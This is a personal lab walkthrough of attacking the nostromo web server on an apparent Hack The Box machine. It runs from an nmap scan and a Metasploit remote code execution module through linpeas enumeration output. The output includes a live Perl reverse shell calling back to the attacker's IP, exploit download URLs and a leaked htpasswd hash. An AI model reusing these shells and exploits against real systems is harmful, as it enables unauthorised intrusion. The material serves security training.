Linux | Easy
Started: 12/8/23

NMAP 
```
# Nmap 7.93 scan initiated Sat Dec  9 02:59:59 2023 as: nmap -sCV -v -oA nmap_out 10.129.100.99
Nmap scan report for 10.129.100.99
Host is up (0.076s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec  9 03:00:18 2023 -- 1 IP address (1 host up) scanned in 19.23 seconds
```

- searched exploit-db for nostromo
	- https://www.exploit-db.com/exploits/47837

```
exploit/multi/http/nostromo_code_exec
```

- this got me shell on the endpoint
- in a weird place /usr/bin
- enumerated OS info with `(cat /proc/version || uname -a ) 2>/dev/null`
	- Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)
- enumerated environment variables with `(env || set) 2>/dev/null`
```env-var-enum FOLD
SERVER_NAME=10.129.100.99
SCRIPT_NAME=/../../../../bin/sh
GATEWAY_INTERFACE=CGI/1.1
SERVER_SOFTWARE=nostromo 1.9.6
DOCUMENT_ROOT=/var/nostromo/htdocs
PWD=/usr/bin
REQUEST_URI=/../../../../bin/sh
SERVER_SIGNATURE=<address>nostromo 1.9.6 at 10.129.100.99 Port 80</address>
REMOTE_PORT=22419
SERVER_ADMIN=david@traverxec.htb
HTTP_HOST=10.129.100.99
SERVER_ADDR=127.0.1.1
HTTP_USER_AGENT=Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
SHLVL=1
CONTENT_LENGTH=244
SERVER_PROTOCOL=HTTP/1.1
SERVER_PORT=80
SCRIPT_FILENAME=/var/nostromo/htdocs/../../../../bin/sh
REMOTE_ADDR=10.10.14.3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CONTENT_TYPE=application/x-www-form-urlencoded
REQUEST_METHOD=POST
_=/usr/bin/env
```

- nothing crazy really sticking out. I did highlight the SERVER_ADMIN=david@traverxec.htb
- used searchsploit on linux kernel `searchploit Linux 4.19`
```kernel-vuln FOLD
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method | linux/local/47164.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method | linux/local/47165.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload M | linux/local/47166.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Meth | linux/local/47167.sh
```
- I reviewed 47164.sh, this contained a reference to CVE-2018-18955
- I searched metasploit for that CVE and came back with `linux/local/nested_namespace_idmap_limit_priv_esc`
- I don't think this is the correct exploit. I think I need to use the code used in the .sh file
- I found that I could navigate to /tmp on the server and had read/write access there
- I tried running wget from here to see if I could access the python http server I had set up on my endpoint - nope.
- I was able to (shakily) get vim to open where I wrote the .sh script to a file called new.sh
- I ran that with bash ./new.sh and it failed with `[-] gcc is not installed`
- I wasn't sure if this was an error with the code that I copy pasta'd so I tried to make a new one, but now vim won't open
- I aborted the session and made a new one (maybe the terminal was busted)
- I reinitiated the RCE exploit and found that I couldn't even navigate to /tmp anymore. Not sure why. I put the cd /tmp command in, but nothing happens.
- oh wait, noticing that I did have a call back to my http server at one point...
```http-callback FOLD
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.100.99 - - [09/Dec/2023 04:21:17] code 400, message Bad HTTP/0.9 request type ('nano')
10.129.100.99 - - [09/Dec/2023 04:21:17] "nano shell.sh" 400 -
```
- went back and figured out this was from when I tried `nc 10.10.14.3 8000` from /tmp. 
```sending FOLD
nc 10.10.14.3 8000
nano shell.sh
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad HTTP/0.9 request type ('nano').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>
```
```received FOLD
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.100.99 - - [09/Dec/2023 04:21:17] code 400, message Bad HTTP/0.9 request type ('nano')
10.129.100.99 - - [09/Dec/2023 04:21:17] "nano shell.sh" 400 -
```
- still can't get back to /tmp
- the *only* thing I did was try the `linux/local/nested_namespace_idmap_limit_priv_esc` but that failed (because it identified the shell as unix/cmd and wants linux). I guess I might as well try it again?
- nope, nothing. I ran it, it failed again, I reattached to the session and still not able to cd to /tmp

# 12/9/23
- while away from this, I thought about running `python3 -c 'import pty;pty.spawn("/bin/bash")'` to get a proper shell - this worked fine
- I was mysteriously able to cd to tmp again. Maybe it was the shell that I spawned? I also rebooted both the server and attacking box before I started
- I was able to host linpeas locally on my attacking host and used wget to download to the victim
- successfully ran linpeas. Things of interest: 
	- sudo version 1.8.27
	- linux exploit suggester
```exploit-suggester FOLD
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.
```

- Analyzing Htpasswd Files (limit 70)
	`-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswddavid:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/`

```full-linpeas FOLD
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: traverxec
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.27


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Sat Dec  9 10:22:12 EST 2023
 10:22:12 up 23 min,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=b94f39a4-394e-4755-bdc1-205c141583a6 /               ext4    errors=remount-ro 0       1
UUID=4694341c-5642-4505-8593-0e44d799f109 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?
GATEWAY_INTERFACE=CGI/1.1
CONTENT_TYPE=application/x-www-form-urlencoded
HISTFILESIZE=0
SHLVL=1
REMOTE_ADDR=10.10.14.3
OLDPWD=/usr/bin
DOCUMENT_ROOT=/var/nostromo/htdocs
REMOTE_PORT=26542
HTTP_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46
SERVER_SIGNATURE=<address>nostromo 1.9.6 at 10.129.44.24 Port 80</address>
LC_CTYPE=C.UTF-8
CONTENT_LENGTH=244
SCRIPT_FILENAME=/var/nostromo/htdocs/../../../../bin/sh
HTTP_HOST=10.129.44.24
REQUEST_URI=/../../../../bin/sh
_=./linpeas_linux_amd64
SERVER_SOFTWARE=nostromo 1.9.6
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_PROTOCOL=HTTP/1.1
HISTSIZE=0
REQUEST_METHOD=POST
SERVER_ADMIN=david@traverxec.htb
SERVER_ADDR=127.0.1.1
PWD=/tmp
SERVER_PORT=80
SCRIPT_NAME=/../../../../bin/sh
HISTFILE=/dev/null
SERVER_NAME=10.129.44.24

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  0.9 103796 10088 ?        Ss   09:58   0:00 /sbin/init
root       249  0.0  0.8  30124  8296 ?        Ss   09:58   0:00 /lib/systemd/systemd-journald
root       266  0.0  0.4  21920  4896 ?        Ss   09:58   0:00 /lib/systemd/systemd-udevd
systemd+   385  0.0  0.6  93080  6560 ?        Ssl  09:58   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       386  0.0  1.0  48220 10984 ?        Ss   09:58   0:00 /usr/bin/VGAuthService
root       387  0.6  1.2 122884 12300 ?        Ssl  09:58   0:08 /usr/bin/vmtoolsd
root       399  0.0  0.6  19304  6492 ?        Ss   09:58   0:00 /lib/systemd/systemd-logind
message+   400  0.0  0.3   8980  3728 ?        Ss   09:58   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       402  0.0  0.5   9488  5468 ?        Ss   09:58   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       405  0.0  0.2   8476  2760 ?        Ss   09:58   0:00 /usr/sbin/cron -f
root       610  0.3  1.1  69100 12112 ?        S    09:58   0:05 /usr/sbin/vmtoolsd
root       656  0.0  1.0  40280 11092 ?        S    09:58   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root       753  0.0  0.1   5612  1668 tty1     Ss+  09:58   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
www-data   755  0.0  0.2   8076  2440 ?        S    09:58   0:00 /usr/local/sbin/nhttpd
root       759  0.0  0.6  15852  6524 ?        Ss   09:58   0:00 /usr/sbin/sshd -D
www-data   932  0.0  0.6  11600  7020 ?        S    10:04   0:00 perl -MIO -e $p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.3:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};
www-data   947  0.0  0.0   2388   760 ?        S    10:15   0:00  _ sh -c python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data   948  0.0  0.8  17048  8396 ?        S    10:15   0:00      _ python3 -c import pty;pty.spawn("/bin/bash")
www-data   949  0.0  0.3   7060  3412 pts/0    Ss   10:15   0:00          _ /bin/bash
www-data   963  0.0  0.7 704124  7092 pts/0    Sl+  10:22   0:00              _ ./linpeas_linux_amd64
www-data   967  0.0  0.0   5496   744 pts/0    S+   10:22   0:00                  _ base64 -d
www-data   968  0.2  0.2   3400  2736 pts/0    S+   10:22   0:00                  _ /bin/sh
www-data  3986  0.0  0.1   3400  1220 pts/0    S+   10:22   0:00                      _ /bin/sh
www-data  3990  0.0  0.2  10976  2972 pts/0    R+   10:22   0:00                      |   _ ps fauxwww
www-data  3989  0.0  0.1   3400  1220 pts/0    S+   10:22   0:00                      _ /bin/sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
-rwxr-xr-x 1 root     root     1168776 Apr 18  2019 /bin/bash
lrwxrwxrwx 1 root     root           4 Oct 25  2019 /bin/sh -> dash
-rwxr-xr-x 1 root     root      145488 Aug 20  2019 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root     root      231560 Aug 20  2019 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root     root       55360 Aug 20  2019 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root     root      678392 Aug 20  2019 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root     root       64744 Jan 10  2019 /sbin/agetty
-rwxr-xr-x 1 root     root      504528 Dec 10  2018 /sbin/dhclient
lrwxrwxrwx 1 root     root          20 Aug 20  2019 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root     root      131360 Aug 24  2022 /usr/bin/VGAuthService
-rwxr-xr-x 1 root     root      240680 Jun  9  2019 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root     root       56808 Aug 24  2022 /usr/bin/vmtoolsd
lrwxrwxrwx 1 root     root          37 Nov 12  2019 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin64/appLoader
-r-xr-xr-x 1 root     bin        72984 Oct 25  2019 /usr/local/sbin/nhttpd
-rwxr-xr-x 1 root     root       55792 Jun 23  2019 /usr/sbin/cron
-rwxr-xr-x 1 root     root      807336 Oct  6  2019 /usr/sbin/sshd
lrwxrwxrwx 1 root     root          37 Nov 12  2019 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin64/vmtoolsd

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 385 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 400 with ppid 1 is run by user messagebus but the ppid user is root
Proc 755 with ppid 1 is run by user www-data but the ppid user is root
Proc 932 with ppid 1 is run by user www-data but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF  NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1042 Jun 23  2019 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Sep 16  2022 .
drwxr-xr-x 73 root root 4096 Dec  9 10:22 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder

/etc/cron.daily:
total 36
drwxr-xr-x  2 root root 4096 Sep 16  2022 .
drwxr-xr-x 73 root root 4096 Dec  9 10:22 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
-rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 16  2022 .
drwxr-xr-x 73 root root 4096 Dec  9 10:22 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 16  2022 .
drwxr-xr-x 73 root root 4096 Dec  9 10:22 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Sep 16  2022 .
drwxr-xr-x 73 root root 4096 Dec  9 10:22 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
Sun 2023-12-10 00:00:00 EST  13h left Sat 2023-12-09 09:58:56 EST  24min ago logrotate.timer              logrotate.service
Sun 2023-12-10 00:00:00 EST  13h left Sat 2023-12-09 09:58:56 EST  24min ago man-db.timer                 man-db.service
Sun 2023-12-10 05:53:09 EST  19h left Sat 2023-12-09 09:58:56 EST  24min ago apt-daily.timer              apt-daily.service
Sun 2023-12-10 06:40:50 EST  20h left Sat 2023-12-09 09:58:56 EST  24min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2023-12-10 10:14:07 EST  23h left Sat 2023-12-09 10:14:07 EST  8min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/dbus/system_bus_socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                             385 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
:1.1                               1 systemd         root             :1.1          init.scope                -          -
:1.197                          6220 busctl          www-data         :1.197        nostromo.service          -          -
:1.3                             399 systemd-logind  root             :1.3          systemd-logind.service    -          -
org.freedesktop.DBus               1 systemd         root             -             init.scope                -          -
org.freedesktop.hostname1          - -               -                (activatable) -                         -
org.freedesktop.locale1            - -               -                (activatable) -                         -
org.freedesktop.login1           399 systemd-logind  root             :1.3          systemd-logind.service    -          -
org.freedesktop.network1           - -               -                (activatable) -                         -
org.freedesktop.resolve1           - -               -                (activatable) -                         -
org.freedesktop.systemd1           1 systemd         root             :1.1          init.scope                -          -
org.freedesktop.timedate1          - -               -                (activatable) -                         -
org.freedesktop.timesync1        385 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
traverxec
127.0.0.1	localhost
127.0.1.1	traverxec.htb	traverxec

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8
htb

╔══════════╣ Interfaces
default		0.0.0.0
loopback	127.0.0.0
link-local	169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.44.24  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:96:d7:f8  txqueuelen 1000  (Ethernet)
        RX packets 2990  bytes 3461304 (3.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2135  bytes 171204 (167.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1710 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1710 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╔══════════╣ Do I have PGP keys?
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0), so sudo tokens could be abused

╔══════════╣ Checking Pkexec policy
